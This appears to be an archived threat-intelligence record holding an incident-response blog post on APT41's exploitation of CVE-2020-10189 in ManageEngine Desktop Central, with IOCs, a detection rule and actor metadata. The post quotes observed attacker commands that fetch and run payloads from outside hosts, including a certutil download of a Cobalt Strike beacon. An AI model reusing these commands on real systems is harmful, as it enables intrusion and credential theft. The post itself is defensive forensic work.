{
    "id": "73bb898f-d60b-4cee-90a1-0b49d4b16f16",
    "created_at": "2023-01-12T15:10:13.580204Z",
    "updated_at": "2025-03-27T02:16:17.094014Z",
    "deleted_at": null,
    "sha1_hash": "f4cfeb0ac7789d0d69ba572fb0f16cfd7991933d",
    "title": "2020-03-20 - Analysis Of Exploitation- CVE-2020-10189 ( exploited by APT41)",
    "authors": "",
    "file_creation_date": "2022-05-28T18:58:38Z",
    "file_modification_date": "2022-05-28T18:58:38Z",
    "file_size": 633596,
    "plain_text": "# Analysis Of Exploitation: CVE-2020-10189\n\n**[blog.reconinfosec.com/analysis-of-exploitation-cve-2020-10189/](https://blog.reconinfosec.com/analysis-of-exploitation-cve-2020-10189/)**\n\nThe Recon incident response team recently worked an intrusion case involving a ManageEngine\nDesktop Central server that was affected by CVE-2020-10189.\n\n_Zoho ManageEngine Desktop Central 10 allows remote code execution because of_\n_deserialization of untrusted data in getChartImage in the FileStorage class. This is related_\n_to the CewolfServlet and MDMLogUploaderServlet servlets._\n\n[https://nvd.nist.gov/vuln/detail/CVE-2020-10189#vulnCurrentDescriptionTitle](https://nvd.nist.gov/vuln/detail/CVE-2020-10189#vulnCurrentDescriptionTitle)\n\n## Remote Code Execution vulnerability disclosed on Twitter\n\nDuring our research of Desktop Central vulnerabilities we located a post on Twitter from a\nresearcher who had disclosed an RCE for Desktop Central on March 5, 2020 (Figure 1).\n\n**Figure 1 - Vulnerability disclosed on Twitter**\n\nResearch on CVE-2020-10189 also showed that vulnerable Desktop Central servers were\nsearchable on [Shodan, a popular search engine for Internet-connected devices often used by](https://www.shodan.io/)\nattackers looking for vulnerable targets (Figure 2).\n\n\n-----\n\n**Figure 2 - Vulnerable Desktop**\n\nCentral servers searchable on Shodan\n\nInitial compromise was determined based on a suspicious PowerShell download cradle that\ncontained instructions to download files from a dotted quad url.\n\nOne of the earliest activities carried out by the actor are a few suspicious PowerShell download\ncommands. The commands contained instructions to\ndownload `install.bat and` `storesyncsvc.dll to` `C:\\Windows\\Temp and then immediately`\nexecute `install.bat (figure 3).`\n```\ncmd /c powershell $client = new-object\nSystem.Net.WebClient;$client.DownloadFile('http://66.42.98.220:12345/test/install.bat','C:\n $client = new-object\nSystem.Net.WebClient;$client.DownloadFile('http://66.42.98.220:12345/test/storesyncsvc.dll\n\n```\n**Figure 3 -**\n\nSuspicious PowerShell download commands\nThe `install.bat script contained instructions to install` `storesyncsvc.dll as a service on`\nthe system. (Figure 4).\n\n\n-----\n\n**Figure**\n\n**4 - Install.bat contents**\n\nPredictably, within seconds of the suspicious PowerShell commands being run, we observed the\ninstallation of a new service with the Service Name `StorSyncSvc and Display Name`\nof `Storage Sync Service (Figure 5).`\n\n\n-----\n\n**Figure 5 - Storage Sync**\n\nService install\n\nOSINT quickly confirmed `storesyncsvc.dll to be previously observed by others hit by this`\ncampaign. VirusTotal results indicated that several detection engines had already\nclassified `storesyncsvc.dll as malware.`\n\nhttps://www.virustotal.com/gui/file/f91f2a7e1944734371562f18b066f193605e07223aab90bd1e89\n25e23bbeaa1c/details\n\n## Leveraging Process Tracking to Identify Application Exploitation\n\nKnowing that an RCE had been disclosed via Twitter on March 5, 2020, only a few days prior to\nthis intrusion, we already had a strong theory on the attack vector being exploitation of the Zoho\nManageEngine Desktop Central application.\n\nReview of Sysmon process creation events indicated\nthat `C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe was the process`\nresponsible for executing the PowerShell Download commands (Figure 6).\n\n**Figure 6 -**\n\nParentImage responsible for PowerShell download\n\n\n-----\n\nLooking at processes in memory, we also observed the parent/child relationship between the\nDesktop Central `java.exe application,` `cmd.exe and` `2.exe (Figure 7).`\n\n**Figure**\n\n**7 -** `java.exe parent/child process relationships`\n\n## Leveraging Filesystem Artifacts to Identify Application Exploitation\n\nTo further validate our theory, we compared the artifacts that had been collected from the affected\nDesktop Central server to the POC that had been published and determined that the attacker had\nlikely leveraged the CVE-2020-10189 vulnerability to run code on this vulnerable system.\n\nThrough filesystem timeline analysis we determined that a traversal file write had likely occurred\non the system with the file names `_chart (Figure 8) and` `logger.zip (Figure 9).`\n\n**Figure 8 - File**\n\nsystem analysis `_chart`\n\n\n-----\n\nsystem analysis `logger.zip`\n\nThese file names were also referenced in the POC that had been released\nby [@Steventseeley (Figure 10).](https://twitter.com/steventseeley)\n\n\n**Figure 9 - File**\n\nFigure 10 - POC\n\n\nreferences to `_chart and` `logger.zip, reference:` https://srcincite.io/pocs/src-20200011.py.txt\n\n## Command and Control Payload Introduced To System\n\n\n-----\n\nSubsequent process creation logs revealed `cmd.exe and` `certutil.exe commands being`\nused to download and execute `2.exe (Figure 11). Further analysis revealed a high likelihood of`\n```\n 2.exe being part of the popular post-exploitation and C2 tool Cobalt Strike.\ncmd /c certutil -urlcache -split -f http://91.208.184.78/2.exe && 2.exe\n\n```\n**Figure 11 -**\n\nCertutil commands\nOSINT revealed that `2.exe was already identified as malware by several detection engines on`\nVirusTotal: https://www.virustotal.com/gui/file/d854f775ab1071eebadc0eb44d8571c387567c233a\n71d2e26242cd9a80e67309/details\n\nLeveraging app.any.run sandbox (Figure 12) and memory analysis of the malware further\nconfirmed the likelihood of `2.exe being a hosted Cobalt Strike Beacon payload.`\n\n**Figure**\n\n**12 -** `2.exe classified as Cobalt Strike Beacon`\nhttps://any.run/report/d854f775ab1071eebadc0eb44d8571c387567c233a71d2e26242cd9a80e67\n309/e65dd4ff-60c6-49a4-8e6d-94c6c80a74b6\n\n### YARA ANALYSIS SUPPORTS 2.EXE CLASSIFICATION AS COBALT STRIKE\n\nWe performed a yara scan against all memory sections in use by the known malware, `2.exe .`\nThe yara scan results further supported the theory of `2.exe resembling a Cobalt Strike beacon`\namong several other possible malware signature hits (Figure 13).\n\n\n-----\n\n**Figure 13 - Yarascan results**\n\nLeveraging Volatility’s malfind plugin, we identified several memory sections with potential signs\nof code injection. We fired off another yara scan, this time against the memory sections dumped\nby malfind. This provided additional validation of the likely presence of a Cobalt Strike Beacon.\nSee that entire process in the asciinema recording below (Figure 14).\n\nFigure 14 - Yarascan against malfind output\nWe then examined malfind’s output for evidence of code injection and identified suspicious\nmemory sections within `svchost.exe (Figure 15). OSINT research led us to a researcher that`\nhad reversed the malware and found the area responsible for injecting code\ninto `svchost.exe (Figure 16).`\n\n**Figure**\n\n**15 - Our analysis of svchost containing injected code**\n\n\n-----\n\n**Figure**\n\n**16 - @VK_Intel’s analysis showing likely inject function**\nReference:\n\nAmong the post-compromise activities, we observed malicious Bitsadmin commands that\ncontained instructions to transfer `install.bat from` `66.42.96.220 over suspicious`\nport `12345 .`\n\nOur analysts observed bitsadmin commands being run on the Desktop Central server which\ncontained the same IP address, port and the same install.bat file called in the PowerShell\ndownload commands (Figure 17).\n```\ncmd /c bitsadmin /transfer bbbb http://66.42.98.220:12345/test/install.bat\nC:\\Users\\Public\\install.bat\n\n```\n**Figure**\n\n**17 - Bitsadmin commands**\n\n## Credential Access\n\nWe also observed potential credential access activity. A common technique for attackers to\nperform credential dumping is using a malicious process (SourceImage) to access another\nprocess (the TargetImage). Most commonly, `lsass.exe is targeted as it often contains sensitive`\ninformation such as account credentials.\n\nHere, we observed the SourceImage `2.exe accessing the TargetImage` `lsass.exe (Figure`\n18). The Cobalt Strike Beacon contains native credential dumping capabilities similar\nto [Mimikatz. The only required condition to use this capability is SYSTEM privileges, which the](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)\n\n\n-----\n\nattacker had. The event below provides sufficient evidence that the risk of credential access is\nhigh.\n\n**Figure 18**\n\n- `2.exe accessing` `lsass.exe`\n\n## Tools For IR Teams Dealing With Similar Intrusions\n\nDuring our analysis of this intrusion, we added a few collection targets to Eric\nZimmerman's [KAPE tool to add the](https://learn.duffandphelps.com/kape) [relevant logs to triage efforts.](https://github.com/EricZimmerman/KapeFiles/commit/c5ca95acd929bc3c6ab613e3e43d52504a478f03) [Read more about KAPE.](https://binaryforay.blogspot.com/2019/02/introducing-kape.html)\n\nExample usage targeting relevant logs (tune for your use-case):\n\n```\nkape.exe --tsource C: --tdest c:\\temp\\tout --tflush --target ManageEngineLogs\n\n```\n\n## IOCs\n```\n   Storesyncsvc.dll\n\n```\nMD5: `5909983db4d9023e4098e56361c96a6f`\nSHA256: `f91f2a7e1944734371562f18b066f193605e07223aab90bd1e8925e23bbeaa1c`\n```\n   Install.bat\n\n```\nMD5: `7966c2c546b71e800397a67f942858d0`\nSHA256: `de9ef08a148305963accb8a64eb22117916aa42ab0eddf60ccb8850468a194fc`\n```\n   2.exe\n\n```\nMD5: `3e856162c36b532925c8226b4ed3481c`\nSHA256: `d854f775ab1071eebadc0eb44d8571c387567c233a71d2e26242cd9a80e67309`\n```\n   66[.]42[.]98[.]220\n   91[.]208[.]184[.]78\n   74[.]82[.]201[.]8\n\n## Detection\n\n```\nFlorian Roth of the Sigma project has created a signature to detect some of the techniques\nleveraged by the attackers:\n\nhttps://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_\n2020_10189.yml\n\n\n-----\n\nOur analysis of this attack also found that detection based on command-line activity in process\ncreation logs would be valuable.\n```\nParentImage | endswith: \n     'DesktopCentral_Server\\jre\\bin\\java.exe'\nCommandLine | contains: \n     '*powershell*'\n     '*certutil*'\n     '*bitsadmin*'\n\n```\n**[UPDATE]**\n\nThe researchers at Fireeye published an excellent article that contained some of the same\nfindings and included attribution to APT41. You can read more about it here:\n\nhttps://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaignusing-multiple-exploits.html\nTags: [DFIR,](https://blog.reconinfosec.com/topic/dfir) [Incident Response,](https://blog.reconinfosec.com/topic/incident-response) [Forensics,](https://blog.reconinfosec.com/topic/forensics) [SecOps,](https://blog.reconinfosec.com/topic/secops) [InfoSec,](https://blog.reconinfosec.com/topic/infosec) [Defense,](https://blog.reconinfosec.com/topic/defense) [Malware,](https://blog.reconinfosec.com/topic/malware) [Exploit,](https://blog.reconinfosec.com/topic/exploit) CVE2020-10189, [Intel Sharing,](https://blog.reconinfosec.com/topic/intel-sharing) [Zoho,](https://blog.reconinfosec.com/topic/zoho) [Vulnerability,](https://blog.reconinfosec.com/topic/vulnerability) [ManageEngine](https://blog.reconinfosec.com/topic/manageengine)\n\n**Written by** **[Luke Rusten](https://blog.reconinfosec.com/author/luke-rusten)**\n\nSecurity Operations Manager\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-03-20 - Analysis Of Exploitation- CVE-2020-10189 ( exploited by APT41).pdf"
    ],
    "report_names": [
        "2020-03-20 - Analysis Of Exploitation- CVE-2020-10189 ( exploited by APT41).pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536213,
    "ts_updated_at": 1743041777,
    "ts_creation_date": 1653764318,
    "ts_modification_date": 1653764318,
    "files": {
        "pdf": "https://archive.orkl.eu/f4cfeb0ac7789d0d69ba572fb0f16cfd7991933d.pdf",
        "text": "https://archive.orkl.eu/f4cfeb0ac7789d0d69ba572fb0f16cfd7991933d.txt",
        "img": "https://archive.orkl.eu/f4cfeb0ac7789d0d69ba572fb0f16cfd7991933d.jpg"
    }
}